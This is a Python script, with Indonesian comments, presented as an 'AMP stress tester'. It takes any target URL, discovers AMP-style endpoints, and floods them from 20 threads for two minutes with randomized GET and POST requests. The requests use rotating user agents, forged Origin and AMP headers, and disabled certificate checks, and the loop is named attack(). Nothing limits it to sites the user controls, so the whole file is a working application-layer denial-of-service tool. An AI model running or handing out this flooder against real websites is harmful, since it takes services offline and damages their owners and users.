import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AMPTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36"
        ]
        self.headers = {
            "Accept": "text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "AMP-Same-Origin": "true",
            "AMP-Cache-Transform": 'google;v="1"'
        }
        # Endpoint yang umum ada di AMP
        self.endpoints = [
            "amp/",
            "?amp=1",
            "?amp",
            "/amp/api/v0/",
            "amp/viewer",
            "amp-cache/",
            "amp/live-list/",
            "amp-analytics/",
            "amp-access/",
            "amp-story/",
            "amp-bind/",
            "amp-form/"
        ]
        self.payloads = {
            "analytics_test": {
                "requestOrigin": "amp",
                "eventType": "visible",
                "timestamp": int(time.time())
            },
            "form_test": {
                "_amp_source_origin": "null",
                "clientId": "amp-test",
                "formData": {
                    "test": "data"
                }
            }
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def verify_endpoint(self, url, endpoint):
        """Verifikasi ketersediaan endpoint AMP"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={
                    "User-Agent": self.get_random_user_agent(),
                    "AMP-Same-Origin": "true"
                },
                timeout=3,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url):
        """Menemukan endpoint AMP yang valid"""
        print("[INFO] Discovering valid AMP endpoints...")
        valid_endpoints = []
        
        # Tambahkan endpoint discovery khusus AMP
        additional_endpoints = [
            "amp-analytics/ping",
            "amp-story-player",
            "amp-subscriptions/",
            "amp-geo/",
            "amp-consent/",
            "amp-experiment/",
            "amp-state/",
            "amp-list/",
            "amp-selector/",
            "amp-carousel/"
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid AMP endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        if not valid_endpoints:
            print("[WARNING] No valid AMP endpoints found. Using default endpoints.")
            return self.endpoints
        
        return valid_endpoints

    def send_request(self, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        # Tambahkan header khusus AMP
        additional_headers = {
            "AMP-Cache-Transform": 'google;v="1"',
            "AMP-Same-Origin": "true",
            "Origin": url,
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty"
        }
        self.headers.update(additional_headers)
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                if data:
                    # Tambahkan parameter wajib AMP
                    data.update({
                        "_amp_source_origin": url,
                        "ampViewerHost": "cdn.ampproject.org"
                    })
                
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            if response.status_code in [404, 403]:
                return None
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url, workers=10, duration=60):
        print(f"[INFO] Starting AMP stress test on {url} for {duration}s with {workers} threads")
        
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[ERROR] No valid AMP endpoints found. Aborting test.")
            return
            
        self.endpoints = valid_endpoints
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("analytics_test") if method == "POST" else None
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))
                else:
                    time.sleep(random.uniform(0.5, 1.0))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target AMP URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = AMPTester()
        tester.flood(target_url, workers=20, duration=120)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 
